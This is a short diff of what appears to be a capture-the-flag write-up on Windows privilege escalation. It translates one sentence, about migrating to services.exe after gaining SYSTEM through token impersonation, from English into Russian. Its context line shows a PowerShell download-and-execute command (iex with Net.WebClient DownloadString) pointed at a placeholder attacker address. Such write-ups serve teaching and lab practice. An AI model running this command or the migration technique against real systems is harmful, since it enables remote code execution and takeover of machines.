@@ -122,7 +122,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-po
 
 <img src="https://imgur.com/Ivy4Yaa.png"/>
 
-Now even though we have SYSTEM on the machine but still we won't be able to access system files as it uses the primary token of the process and not the impersonated token so we need to migrate to a process running as SYSTEM which is `services.exe`
+Теперь, несмотря на то, что у нас есть SYSTEM на компьютере, мы все равно не сможем получить доступ к системным файлам, поскольку он использует основной токен процесса, а не олицетворенный токен, поэтому нам нужно перейти к процессу, запущенному от имени SYSTEM, который является `services.exe`:
 
 <img src="https://i.imgur.com/ltPg2LG.png"/>
 
